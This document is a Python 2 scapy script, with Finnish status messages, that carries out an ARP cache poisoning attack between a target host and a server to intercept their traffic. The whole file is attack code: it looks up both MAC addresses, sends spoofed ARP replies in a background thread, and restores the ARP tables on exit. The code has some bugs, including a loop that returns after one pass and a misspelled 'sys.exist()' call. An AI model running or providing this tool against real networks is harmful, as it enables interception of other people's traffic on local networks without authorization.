from scapy.all import *
from scapy.error import Scapy_Exception
import os
import sys
import threading
import signal

INTERFACE       =   'eth0'
TARGET_IP       =   '10.10.10.5'
SERVER_IP      =   '10.10.10.6'

def restore_target(server_ip, server_mac, target_ip, target_mac):
    print '...'
    send(ARP(op=2, psrc=server_ip, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', \
        hwsrc=server_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=server_ip, hwdst="ff:ff:ff:ff:ff:ff", \
        hwsrc=target_mac), count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address), \
        timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None

def poison_target(server_ip, server_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = server_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    poison_server = ARP()
    poison_server.op = 2
    poison_server.psrc = target_ip
    poison_server.pdst = server_ip
    poison_server.hwdst = server_mac

    print 'Myrkytys aloitettu'
    while 1:
        try:
	    send(poison_target)
	    send(poison_server)
	    time.sleep(2)

        except KeyboardInterrupt:
            restore_target(server_ip, server_mac, target_ip, target_mac)

        print 'Myrkytys valmis'
        return

if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    print "%s" % INTERFACE
    SERVER_MAC = get_mac(SERVER_IP)
    if SERVER_MAC is None:
        print "Palvelimen MAC ei saatu"
        sys.exit(0)
    else:
        print "Palvelin %s MAC: %s" %(SERVER_IP, SERVER_MAC)

    TARGET_MAC = get_mac(TARGET_IP)
    if TARGET_MAC is None:
        print "Kohteen MAC ei saatu"
        sys.exit(0)
    else:
        print "Kohde %s MAC: %s" % (TARGET_IP, TARGET_MAC)

    poison_thread = threading.Thread(target = poison_target, args=(SERVER_IP, SERVER_MAC, \
        TARGET_IP, TARGET_MAC))
    poison_thread.start()

    try:
        while True:
              time.sleep(5)

    except KeyboardInterrupt:
        restore_target(SERVER_IP, SERVER_MAC, TARGET_IP, TARGET_MAC)
        sys.exist()
